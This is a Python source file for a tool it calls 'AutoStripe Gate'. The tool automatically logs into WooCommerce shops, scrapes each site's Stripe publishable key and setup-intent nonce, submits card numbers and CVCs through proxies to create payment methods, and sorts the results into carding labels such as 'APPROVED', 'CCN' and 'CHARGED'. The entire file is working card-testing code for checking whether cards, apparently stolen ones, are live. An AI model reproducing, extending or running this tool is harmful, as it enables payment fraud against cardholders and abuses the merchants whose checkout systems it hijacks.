"""
AutoStripe Gate - WooCommerce Stripe Card Checker with Auto-Login
Automatically logs into WooCommerce sites, extracts Stripe PK, and validates cards
using the Setup Intent flow (add payment method).
"""

import requests
import re
import json
from bs4 import BeautifulSoup
from typing import Tuple, Optional, Dict


class AutoStripeChecker:
    """WooCommerce Stripe checker with auto-login and PK extraction."""
    
    def __init__(self, domain: str, username: str, password: str, proxy: str = None):
        self.domain = domain.rstrip('/')
        if not self.domain.startswith('http'):
            self.domain = f'https://{self.domain}'
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.stripe_pk = None
        self.proxy = proxy
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })

    def _parse_value(self, data: str, start: str, end: str) -> str:
        """Extract value between two strings."""
        try:
            start_pos = data.index(start) + len(start)
            end_pos = data.index(end, start_pos)
            return data[start_pos:end_pos]
        except ValueError:
            return None

    def login(self) -> Tuple[bool, str]:
        """Login to WooCommerce and extract Stripe public key."""
        try:
            login_url = f"{self.domain}/my-account/"
            res = self.session.get(login_url, timeout=30)
            soup = BeautifulSoup(res.text, 'html.parser')
            
            login_form = soup.find('form', {'class': 'login'})
            if not login_form:
                login_form = soup.find('form', {'id': lambda x: x and 'login' in x.lower()}) or \
                            soup.find('form', {'action': lambda x: x and 'login' in x.lower()}) or \
                            soup.find('form', {'method': 'post'})
            
            if not login_form:
                return False, "Could not find login form"
            
            hidden_inputs = login_form.find_all('input', {'type': 'hidden'})
            form_data = {inp.get('name'): inp.get('value') for inp in hidden_inputs if inp.get('name')}
            
            form_data.update({
                'username': self.username,
                'password': self.password,
                'login': 'Log in',
                'woocommerce-login-nonce': form_data.get('woocommerce-login-nonce', ''),
                '_wp_http_referer': form_data.get('_wp_http_referer', '/my-account/'),
            })
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.domain,
                'Referer': login_url,
            }
            
            res = self.session.post(login_url, headers=headers, data=form_data, timeout=30)
            
            if 'logout' not in res.text.lower() and 'log out' not in res.text.lower():
                if 'invalid' in res.text.lower() or 'incorrect' in res.text.lower() or 'error' in res.text.lower():
                    return False, "Login failed - invalid credentials"
            
            return True, "Login successful"
            
        except requests.exceptions.Timeout:
            return False, "Login timeout"
        except Exception as e:
            return False, f"Login error: {str(e)[:100]}"

    def extract_stripe_pk(self) -> Tuple[bool, str]:
        """Extract Stripe public key from account pages."""
        try:
            pages_to_check = [
                f"{self.domain}/my-account/add-payment-method/",
                f"{self.domain}/my-account/payment-methods/",
                f"{self.domain}/checkout/",
            ]
            
            for page_url in pages_to_check:
                try:
                    res = self.session.get(page_url, timeout=30)
                    
                    match = re.search(r'wc_stripe_params\s*=\s*(\{[^}]+\})', res.text)
                    if match:
                        try:
                            params = json.loads(match.group(1))
                            if params.get('key'):
                                self.stripe_pk = params['key']
                                return True, self.stripe_pk
                        except:
                            pass
                    
                    pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', res.text)
                    if pk_match:
                        self.stripe_pk = pk_match.group(0)
                        return True, self.stripe_pk
                        
                except:
                    continue
            
            return False, "Could not find Stripe public key"
            
        except Exception as e:
            return False, f"PK extraction error: {str(e)[:100]}"

    def get_setup_nonce(self) -> Optional[str]:
        """Get the setup intent nonce from add payment method page."""
        try:
            res = self.session.get(f"{self.domain}/my-account/add-payment-method/", timeout=30)
            nonce = self._parse_value(res.text, '"createAndConfirmSetupIntentNonce":"', '"')
            return nonce
        except:
            return None

    def create_payment_method(self, card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[bool, str]:
        """Create a Stripe payment method."""
        try:
            card_yer = card_yer[-2:] if len(card_yer) > 2 else card_yer
            
            headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
            }
            
            data = {
                'type': 'card',
                'card[number]': card_num,
                'card[cvc]': card_cvc,
                'card[exp_year]': card_yer,
                'card[exp_month]': card_mon,
                'billing_details[address][postal_code]': '10001',
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/v3',
                'key': self.stripe_pk,
            }
            
            proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
            res = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                proxies=proxies,
                timeout=30
            )
            
            if res.status_code == 200:
                pm_id = res.json().get('id')
                return True, pm_id
            else:
                error_data = res.json()
                error_msg = error_data.get('error', {}).get('message', res.text[:200])
                return False, error_msg
                
        except Exception as e:
            return False, f"Payment method error: {str(e)[:100]}"

    def confirm_setup_intent(self, payment_method_id: str, nonce: str) -> Tuple[bool, str]:
        """Confirm the setup intent to validate the card."""
        try:
            headers = {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': self.domain,
                'Referer': f"{self.domain}/my-account/add-payment-method/",
                'X-Requested-With': 'XMLHttpRequest',
            }
            
            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }
            
            res = self.session.post(
                f"{self.domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
                headers=headers,
                data=data,
                timeout=30
            )
            
            return True, res.text
            
        except Exception as e:
            return False, f"Setup intent error: {str(e)[:100]}"


def autostripe_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                     domain: str, username: str, password: str, 
                     proxy: str = None) -> Tuple[str, bool]:
    """
    Check card using AutoStripe (WooCommerce login + Setup Intent flow).
    
    Returns:
        Tuple[str, bool]: (status_message, proxy_alive)
    """
    checker = AutoStripeChecker(domain, username, password, proxy)
    
    success, msg = checker.login()
    if not success:
        return f"LOGIN_FAILED: {msg}", True
    
    success, pk_or_error = checker.extract_stripe_pk()
    if not success:
        return f"NO_STRIPE_PK: {pk_or_error}", True
    
    nonce = checker.get_setup_nonce()
    if not nonce:
        return "NONCE_FAILED: Could not get setup nonce", True
    
    success, pm_or_error = checker.create_payment_method(card_num, card_mon, card_yer, card_cvc)
    if not success:
        error_lower = pm_or_error.lower()
        
        if 'insufficient_funds' in error_lower or 'insufficient funds' in error_lower:
            return "APPROVED: Insufficient Funds (Card Valid)", True
        elif 'incorrect_cvc' in error_lower or 'security code' in error_lower:
            return "CCN: Incorrect CVC", True
        elif 'expired' in error_lower:
            return "DECLINED: Card Expired", True
        elif 'stolen' in error_lower or 'lost' in error_lower:
            return "DECLINED: Lost/Stolen Card", True
        elif 'do_not_honor' in error_lower or 'do not honor' in error_lower:
            return "DECLINED: Do Not Honor", True
        elif 'card_declined' in error_lower or 'declined' in error_lower:
            return "DECLINED: Card Declined", True
        elif 'invalid_number' in error_lower or 'invalid number' in error_lower:
            return "DECLINED: Invalid Card Number", True
        elif 'processing_error' in error_lower:
            return "ERROR: Processing Error", True
        elif 'rate_limit' in error_lower:
            return "ERROR: Rate Limited", True
        else:
            return f"DECLINED: {pm_or_error[:100]}", True
    
    success, result = checker.confirm_setup_intent(pm_or_error, nonce)
    if not success:
        return f"SETUP_FAILED: {result}", True
    
    result_lower = result.lower()
    
    if 'success' in result_lower or '"status":"succeeded"' in result_lower:
        return f"CHARGED: Card Added Successfully [PK: {checker.stripe_pk[:20]}...]", True
    elif 'authentication_required' in result_lower or '3d_secure' in result_lower:
        return "APPROVED: 3DS Required (Card Valid)", True
    elif 'insufficient_funds' in result_lower:
        return "APPROVED: Insufficient Funds (Card Valid)", True
    elif 'incorrect_cvc' in result_lower:
        return "CCN: Incorrect CVC", True
    elif 'error' in result_lower:
        try:
            error_data = json.loads(result)
            error_msg = error_data.get('data', {}).get('error', {}).get('message', result[:100])
            return f"DECLINED: {error_msg}", True
        except:
            return f"DECLINED: {result[:100]}", True
    else:
        return f"UNKNOWN: {result[:100]}", True


def extract_stripe_pk(domain: str, username: str, password: str, proxy: str = None) -> Tuple[bool, str]:
    """
    Extract Stripe public key from a WooCommerce site.
    
    Returns:
        Tuple[bool, str]: (success, pk_or_error_message)
    """
    checker = AutoStripeChecker(domain, username, password, proxy)
    
    success, msg = checker.login()
    if not success:
        return False, f"Login failed: {msg}"
    
    success, pk_or_error = checker.extract_stripe_pk()
    return success, pk_or_error
